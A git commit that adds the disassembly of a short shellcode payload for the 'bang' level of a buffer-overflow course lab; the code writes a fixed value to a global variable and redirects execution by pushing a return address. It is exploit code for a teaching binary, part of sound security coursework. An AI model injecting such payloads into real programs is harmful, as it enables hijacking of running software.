ad4065596ff9892a169270fa6175370b38d51a23
Xudong <xudong714@gmail.com>
2018-05-24 12:52:06 +0800

    add bang_assembly.s

---
+++ lab3-buffer/bang_assembly.s
@@ -0,0 +1,11 @@
+
+bang_assembly.o：     文件格式 elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	c7 05 38 d1 04 08 3a 	movl   $0x3a23453a,0x804d138
+   7:	45 23 3a 
+   a:	68 b3 8b 04 08       	push   $0x8048bb3
+   f:	c3                   	ret    
